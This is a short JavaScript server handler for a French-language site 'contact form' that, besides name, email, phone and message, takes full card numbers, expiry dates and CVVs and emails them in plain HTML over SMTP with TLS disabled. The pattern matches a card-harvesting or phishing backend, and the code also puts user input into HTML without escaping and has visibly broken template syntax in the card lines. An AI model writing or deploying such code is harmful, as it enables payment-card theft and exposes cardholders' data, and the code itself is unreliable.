import nodemailer from "nodemailer";

export default defineEventHandler(async (event) => {
  const body = await readBody(event)

  const { pseudo, email, telephone, message, card_number, card_expiration, card_cvv } = body

  if (!email || !pseudo) {
    throw createError({
      statusCode: 400,
      statusMessage: "Champs requis manquants",
    })
  }



  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT),
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  })

  await transporter.verify();

  await transporter.sendMail({
    from: `"Formulaire Site" <${process.env.SMTP_USER}>`,
    to: process.env.MAIL_TO,
    subject: "Nouveau message",
    html: `
      <p><b>Pseudo :</b> ${pseudo}</p>
      <p><b>Email :</b> ${email}</p>
      <p><b>Téléphone :</b> ${telephone}</p>
      <p><b>Message :</b> ${message || "-"}</p>
      <p><b>Carte :</b> ${card_number} || "-"}</p>
      <p><b>Carte_cvv :</b> ${card_cvv} || "-"}</p>
      <p><b>Carte_exp :</b> ${card_expiration} || "-"}</p>
    `,
  }) 

  return { success: true }
})
